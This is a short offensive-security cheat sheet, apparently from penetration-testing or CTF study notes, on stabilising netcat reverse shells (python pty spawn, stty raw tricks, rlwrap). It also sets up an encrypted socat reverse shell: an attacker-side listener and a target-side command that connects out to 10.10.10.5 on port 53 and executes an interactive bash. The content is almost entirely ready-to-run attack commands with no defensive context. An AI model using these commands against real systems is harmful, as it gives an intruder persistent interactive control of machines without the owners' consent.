## Netcat Shell stabilisation

### Technique 1
```
sudo nc -nvlp 443
python -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
^Z

stty raw -echo; fg
```

### Technique 2

```
rlwrap nc -lvnp <port>
^Z
stty raw -echo; fg
```


## Socat

Attacker :
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

On the target machine :
```
socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
